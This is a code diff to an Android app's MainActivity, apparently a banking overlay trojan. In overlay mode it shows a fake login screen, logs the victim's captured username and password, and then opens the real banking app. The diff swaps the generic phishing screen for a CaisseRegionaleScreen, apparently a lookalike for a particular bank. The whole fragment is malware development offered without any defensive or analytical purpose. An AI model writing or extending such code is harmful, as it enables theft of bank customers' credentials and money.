@@ -41,8 +41,9 @@ class MainActivity : ComponentActivity() {
         setContent {
             MaterialTheme {
                 if (isOverlayMode) {
+                    CaisseRegionaleScreen()
                     // Show the fake login screen when launched as overlay
-                    LoginScreen { username, password ->
+                   /* LoginScreen { username, password ->
                         // Log or handle the captured credentials
                         Log.d(TAG, "Captured credentials: $username / $password")
 
@@ -52,7 +53,7 @@ class MainActivity : ComponentActivity() {
                             startActivity(bankingAppIntent)
                         }
                         finish()
-                    }
+                    }*/
                 } else {
                     // Show control panel UI for managing the service
                     ServiceControlPanel()
